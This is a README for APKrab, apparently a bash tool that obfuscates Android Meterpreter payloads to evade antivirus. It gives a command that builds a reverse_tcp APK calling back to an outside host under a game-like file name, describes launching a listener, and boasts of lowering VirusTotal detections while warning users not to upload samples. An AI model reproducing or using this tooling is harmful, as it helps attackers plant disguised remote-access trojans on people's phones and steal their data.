# Deppendencies

# APKrab
APKrab is a dummy bash script to obfuscate android meterpreter by mixing names and permissions in AndroidManifest.xml and other files and directories
![Preview](https://cdn.rawgit.com/whoisML/APKrab/master/vmplayer_R3kyjZHvkA.jpg)

# Usage
First we must give execution permissions with chmod +x APKrab.sh
Then we can do for example:
./APKrab.sh -p android/meterpreter/reverse_tcp -H 10.0.0.16 -P 7777 -o amon-us.apk

APKrab also has default options we can use them with:
./APKrab.sh -g
![Preview](https://cdn.rawgit.com/whoisML/APKrab/master/vmplayer_ZW2I2Xya03.jpg)

At the end APKrab will ask to generate a msfvemon listener if so then it will ask to launch it
![Preview](https://cdn.rawgit.com/whoisML/APKrab/master/vmplayer_Icsbs5mvuD.jpg)

# virustotal results (DONT UPLOAD YOUR SAMPLES TO VIRUSTOTAL)
In this example we hit 16/63 in virustotal so hope with the time and your modifications we can hit 0 flagged
